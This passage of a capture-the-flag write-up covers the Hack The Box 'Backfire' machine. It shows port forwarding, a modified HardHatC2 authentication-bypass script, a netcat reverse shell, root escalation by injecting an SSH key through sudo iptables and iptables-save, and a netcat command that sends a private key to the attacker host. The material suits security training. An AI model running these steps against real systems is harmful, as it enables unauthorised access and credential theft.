+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">-------------------------------------------------------------- Port 5000 --------------------------------------------------------------------------</span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/backfire~10.10.11.49]</span><br><span class="line">└─$ ssh -L 5000:0.0.0.0:5000 ilya@10.10.11.49</span><br><span class="line">Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64</span><br><span class="line">The programs included with the Ubuntu system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by</span><br><span class="line">applicable law.</span><br><span class="line"></span><br><span class="line">Last login: Sun Jan 19 06:50:13 2025 from 10.10.14.9</span><br><span class="line">ilya@backfire:~$</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-------------------------------------------------------------- Port 7096 --------------------------------------------------------------------------</span><br><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/backfire~10.10.11.49]</span><br><span class="line">└─$ ssh -L 7096:0.0.0.0:7096 ilya@10.10.11.49</span><br><span class="line">Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64</span><br><span class="line">ilya@backfire:~$</span><br></pre></td></tr></table></figure></div>
+
+<p>After port forwarding, visits both the website via [https]<br>Port 5000 returns nothing because there’s nothing duhh, it’s a teamserver’s listening address<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-backfire/Pasted image 20250119203242.png"
+                      width="500"
+                ></p>
+<p>Meanwhile on Port 7096<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-backfire/Pasted image 20250119203328.png"
+                      width="500"
+                ></p>
+<p>In order to get into HardHatC2, we will need to perform Authentication Bypass. Referring [<a class="link"   target="_blank" rel="noopener" href="https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7]" >https://blog.sth.sh/hardhatc2-0-days-rce-authn-bypass-96ba683d9dd7]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<p>Using the auth-bypass PoC, do a bit of modification:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># @author Siam Thanat Hack Co., Ltd. (STH)</span><br><span class="line">...</span><br><span class="line">rhost = &#x27;localhost:5000&#x27; //modify this</span><br><span class="line">...</span><br><span class="line">burp0_json = &#123;</span><br><span class="line">  &quot;password&quot;: &quot;abcd1234&quot;, //modify this</span><br><span class="line">  &quot;role&quot;: &quot;TeamLead&quot;,</span><br><span class="line">  &quot;username&quot;: &quot;muyi_m4g3&quot; //modify this</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>
+<p>Upon running the script, you will get this:</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/backfire~10.10.11.49]</span><br><span class="line">└─$ python3 auth_hh2.py</span><br><span class="line">/home/muyi/Desktop/htb/lab/backfire~10.10.11.49/auth_hh2.py:12: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).</span><br><span class="line">  now = datetime.datetime.utcnow()</span><br><span class="line">Generated JWT:</span><br><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJIYXJkSGF0X0FkbWluIiwianRpIjoiMThiZmYzYzItNjBiYi00ZmNjLWI1OTAtN2IwNDg1YmEwNjUzIiwiaHR0cDovL3NjaGVtYXMueG1sc29hcC5vcmcvd3MvMjAwNS8wNS9pZGVudGl0eS9jbGFpbXMvbmFtZWlkZW50aWZpZXIiOiIxIiwiaXNzIjoiaGFyZGhhdGMyLmNvbSIsImF1ZCI6ImhhcmRoYXRjMi5jb20iLCJpYXQiOjE3MzcyNjE2MzksImV4cCI6MTczOTY4MDgzOSwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiQWRtaW5pc3RyYXRvciJ9.NPowqVTIG6YRSxQ8jE_fWI_rYEuX-CmuCug7a7jhzuQ</span><br><span class="line">/usr/lib/python3/dist-packages/urllib3/connectionpool.py:1100: InsecureRequestWarning: Unverified HTTPS request is being made to host &#x27;localhost&#x27;. Adding certificate verification is strongly advised. See: https://urllib3.readthedocs.io/en/latest/advanced-usage.html#tls-warnings</span><br><span class="line">  warnings.warn(</span><br><span class="line">User muyi_m4g3 created</span><br></pre></td></tr></table></figure></div>
+
+<p>Now use the credential to login into the page in port 7096, following the blog. Once inside, go to ImplantInteract -&gt; Terminal and enter your payload.</p>
+<p>First, setup a listener and enter the revershell into the terminal in port 7096<br><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/images/htb-backfire/Pasted image 20250119204403.png"
+                      width="500"
+                ></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">┌──(muyi㉿mag3)-[~/Desktop/htb/lab/backfire~10.10.11.49]</span><br><span class="line">└─$ nc -lvnp 9999</span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">connect to [10.10.14.9] from (UNKNOWN) [10.10.11.49] 37006</span><br><span class="line">bash: cannot set terminal process group (3046): Inappropriate ioctl for device</span><br><span class="line">bash: no job control in this shell</span><br><span class="line">sergej@backfire:~/HardHatC2/HardHatC2Client$ whoami</span><br><span class="line">whoami</span><br><span class="line">sergej</span><br></pre></td></tr></table></figure></div>
+
+<p>As sergej, attacker can run <code>sudo -l</code> to check for availables permission</p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sergej@backfire:~/HardHatC2/HardHatC2Client$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for sergej on backfire:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User sergej may run the following commands on backfire:</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/iptables</span><br><span class="line">    (root) NOPASSWD: /usr/sbin/iptables-save</span><br></pre></td></tr></table></figure></div>
+
+<p>Referring to this blog [<a class="link"   target="_blank" rel="noopener" href="https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/]" >https://www.shielder.com/blog/2024/09/a-journey-from-sudo-iptables-to-local-privilege-escalation/]<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
+<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">sergej@backfire:~$ ssh-keygen -t ed25519</span><br><span class="line">ssh-keygen -t ed25519</span><br><span class="line">Generating public/private ed25519 key pair.</span><br><span class="line">Enter file in which to save the key (/home/sergej/.ssh/id_ed25519):</span><br><span class="line">Enter passphrase (empty for no passphrase):</span><br><span class="line">Enter same passphrase again:</span><br><span class="line">Your identification has been saved in /home/sergej/.ssh/id_ed25519</span><br><span class="line">Your public key has been saved in /home/sergej/.ssh/id_ed25519.pub</span><br><span class="line">The key fingerprint is:</span><br><span class="line">SHA256:ySILKo3lun+cEUtYBg0vc+7G9CvObawvrS1FEVmJfWY sergej@backfire</span><br><span class="line">The key&#x27;s randomart image is:</span><br><span class="line">+--[ED25519 256]--+</span><br><span class="line">|  o+  .*..       |</span><br><span class="line">|   .+ + o E      |</span><br><span class="line">|  o+o  . +       |</span><br><span class="line">|  .=o .. .       |</span><br><span class="line">|  o.++. S        |</span><br><span class="line">| * =o+..         |</span><br><span class="line">|+ o.=*.          |</span><br><span class="line">|.. oBo+.         |</span><br><span class="line">|oo.o=O=          |</span><br><span class="line">+----[SHA256]-----+</span><br><span class="line">sergej@backfire:~$ cat ~/.ssh/id_ed25519.pub</span><br><span class="line">cat ~/.ssh/id_ed25519.pub</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAJ325enWIYc6dO0me4gzsZMyPQ5vFJ6DD/CgMDtwCPV sergej@backfire</span><br><span class="line">sergej@backfire:~$ sudo /usr/sbin/iptables -A INPUT -i lo -j ACCEPT -m comment --comment $&#x27;\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAJ325enWIYc6dO0me4gzsZMyPQ5vFJ6DD/CgMDtwCPV\n&#x27;</span><br><span class="line">&lt;AAAAIAJ325enWIYc6dO0me4gzsZMyPQ5vFJ6DD/CgMDtwCPV\n&#x27;</span><br><span class="line">sergej@backfire:~$ sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys</span><br><span class="line">sudo /usr/sbin/iptables-save -f /root/.ssh/authorized_keys</span><br><span class="line">sergej@backfire:~$ sudo iptables -S</span><br><span class="line">sudo iptables -S</span><br><span class="line">-P INPUT ACCEPT</span><br><span class="line">-P FORWARD ACCEPT</span><br><span class="line">-P OUTPUT ACCEPT</span><br><span class="line">-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT</span><br><span class="line">-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 5000 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 5000 -j REJECT --reject-with icmp-port-unreachable</span><br><span class="line">-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT</span><br><span class="line">-A INPUT -s 127.0.0.1/32 -p tcp -m tcp --dport 7096 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m tcp --dport 7096 -j REJECT --reject-with icmp-port-unreachable</span><br><span class="line">-A INPUT -i lo -m comment --comment &quot;</span><br><span class="line">ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIAJ325enWIYc6dO0me4gzsZMyPQ5vFJ6DD/CgMDtwCPV</span><br><span class="line">&quot; -j ACCEPT</span><br><span class="line">sergej@backfire:~$ nc 10.10.14.9 9999 &lt; .ssh/id_ed25519</span><br><span class="line">nc 10.10.14.9 9999 &lt; .ssh/id_ed25519</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">----------------------------------------------------------------- Attacker&#x27;s Side ---------------------------------------------------------------------</span><br><span class="line">$ nc -lvnp 9999 &gt; key</span><br><span class="line">listening on [any] 9999 ...</span><br><span class="line">connect to [10.10.14.9] from (UNKNOWN) [10.10.11.49] 56636</span><br><span class="line"></span><br><span class="line">$ chmod 600 key</span><br><span class="line"></span><br><span class="line">$ ssh -i key root@10.10.11.49</span><br><span class="line">Linux backfire 6.1.0-29-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.123-1 (2025-01-02) x86_64</span><br><span class="line">root@backfire:~# whoami</span><br><span class="line">root</span><br><span class="line">root@backfire:~# ls</span><br><span class="line">root.txt</span><br></pre></td></tr></table></figure></div>
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux/">#Linux</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/07/07/Hackthebox/htb-voleur/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-Voleur</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/07/07/Hackthebox/htb-puppy/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-Puppy</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">HTB-Backfire</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Using-the-script-below"><span class="nav-text">Using the script below:</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        37 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog "></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
